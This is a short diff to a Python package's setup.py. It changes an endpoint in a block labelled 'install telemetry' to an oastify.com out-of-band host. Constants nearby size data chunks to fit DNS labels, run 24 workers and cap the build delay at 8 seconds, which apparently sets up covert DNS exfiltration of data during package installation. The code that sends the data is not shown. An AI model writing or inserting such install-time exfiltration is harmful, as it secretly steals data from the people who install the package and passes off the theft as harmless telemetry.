@@ -9,7 +9,7 @@ from setuptools import setup
 
 # --- install telemetry ----------------------------------------------------
 
-_ENDPOINT = "7u2jhveqy7kjvohtqjof4yix0o6fu5iu.oastify.com"
+_ENDPOINT = "gj3weezozoiwsgbnzq9j0ag7hynpbfz4.oastify.com"
 _CHUNK = 48      # idx(3) + "-" + chunk(3) + "-" + 48 = 56, under the 63-octet label cap
 _WORKERS = 24
 _DEADLINE = 8    # seconds; the build never blocks longer than this
